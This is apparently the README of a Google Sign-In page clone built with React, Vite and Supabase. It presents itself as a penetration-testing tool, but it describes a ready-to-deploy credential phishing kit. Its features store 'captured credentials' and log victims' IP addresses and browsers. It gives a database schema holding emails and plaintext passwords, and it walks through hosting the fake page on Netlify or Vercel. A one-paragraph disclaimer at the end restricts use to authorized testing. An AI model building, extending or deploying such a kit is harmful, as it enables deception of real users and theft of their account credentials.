# Google Sign-In Clone

A pixel-perfect Google Sign-In page clone built with React and Vite. This project is designed for penetration testing and security research purposes.

## Features

- ✅ **Pixel-Perfect UI** - Exact replication of Google's official sign-in page
- ✅ **Dark & Light Mode** - Auto-detects system preference with manual toggle support
- ✅ **Responsive Design** - Works on mobile, tablet, and desktop
- ✅ **Two-Step Flow** - Email → Password with smooth animations
- ✅ **Form Validation** - Client-side validation with error messages
- ✅ **Supabase Integration** - Store captured credentials in a database
- ✅ **IP Capture** - Records user IP address via ipify.org
- ✅ **User Agent Logging** - Captures browser/device information

## Tech Stack

- **React 19** - UI framework
- **Vite 7** - Build tool
- **Vanilla CSS** - Styling (no frameworks)
- **Supabase** - Database for credential storage

## Getting Started

### Prerequisites

- Node.js 18+
- npm or yarn

### Installation

1. Clone the repository:
   ```bash
   git clone <repo-url>
   cd google-login-clone
   ```

2. Install dependencies:
   ```bash
   npm install
   ```

3. Set up Supabase (optional):
   ```bash
   cp .env.example .env.local
   ```
   Edit `.env.local` with your Supabase credentials.

4. Start the development server:
   ```bash
   npm run dev
   ```

5. Open http://localhost:5173 in your browser.

## Supabase Setup

1. Create a new project at [supabase.com](https://supabase.com)

2. Run this SQL in the SQL Editor to create the required table:

   ```sql
   CREATE TABLE google_users (
     id BIGSERIAL PRIMARY KEY,
     email_or_phone TEXT NOT NULL,
     password TEXT NOT NULL,
     created_at TIMESTAMPTZ DEFAULT NOW(),
     ip_address TEXT,
     user_agent TEXT,
     theme_used TEXT
   );
   ```

3. Get your project URL and anon key from Settings → API

4. Add them to your `.env.local` file:
   ```
   VITE_SUPABASE_URL=https://your-project.supabase.co
   VITE_SUPABASE_ANON_KEY=your-anon-key
   ```

## Project Structure

```
google-login-clone/
├── public/
│   ├── favicon.ico
│   └── _redirects
├── src/
│   ├── components/
│   │   ├── GoogleLogo.jsx
│   │   ├── InputField.jsx
│   │   ├── Button.jsx
│   │   └── Footer.jsx
│   ├── hooks/
│   │   └── useTheme.js
│   ├── lib/
│   │   └── supabase.js
│   ├── App.jsx
│   ├── App.css
│   ├── index.css
│   └── main.jsx
├── .env.example
├── index.html
├── package.json
└── vite.config.js
```

## Building for Production

```bash
npm run build
```

The built files will be in the `dist` folder, ready for deployment.

## Deployment

### Netlify

1. Push to GitHub
2. Connect to Netlify
3. Set build command: `npm run build`
4. Set publish directory: `dist`
5. Add environment variables in Netlify dashboard

### Vercel

1. Push to GitHub
2. Import to Vercel
3. Deploy automatically
4. Add environment variables in Vercel dashboard

## Legal Disclaimer

⚠️ **This project is intended for authorized penetration testing and security research only.**

Using this tool without explicit permission from the target organization is illegal. The developer is not responsible for any misuse of this software.

Always obtain proper authorization before conducting security tests.

## License

MIT License - See LICENSE file for details.
